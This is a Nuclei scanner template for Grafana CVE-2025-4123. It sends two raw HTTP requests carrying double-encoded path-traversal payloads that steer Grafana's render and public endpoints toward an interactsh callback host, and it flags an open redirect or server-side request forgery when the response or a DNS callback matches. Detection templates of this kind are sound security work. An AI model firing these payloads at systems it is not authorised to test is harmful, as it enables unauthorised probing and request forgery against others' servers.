id: Grafana-CVE-2025-4123-XSSOpenRedirectSSRF

info:
  name: Grafana-CVE-2025-4123-XSSOpenRedirectSSRF
  author: iSee857
  severity: high
  description: |
    Grafana-CVE-2025-4123-XSSOpenRedirectSSRF.

http:
  - raw:
      - |
        GET /render/public/..%252f%255C{{interactsh-url}}%252f%253F%252f..%252f.. HTTP/1.1
        Host: {{Hostname}}

      - |
        GET /public/..%2F%5c{{interactsh-url}}%2F%3f%2F..%2F.. HTTP/1.1
        Host: {{Hostname}}

    matchers:
      - type: dsl
        name: open-redirect
        dsl:
          - status_code == 302 && contains(location, '/\\{{interactsh-url}}/?/../../')

      - type: dsl
        name: ssrf
        dsl:
          - contains(interactsh_protocol, 'dns') && contains(content_type, 'image/png')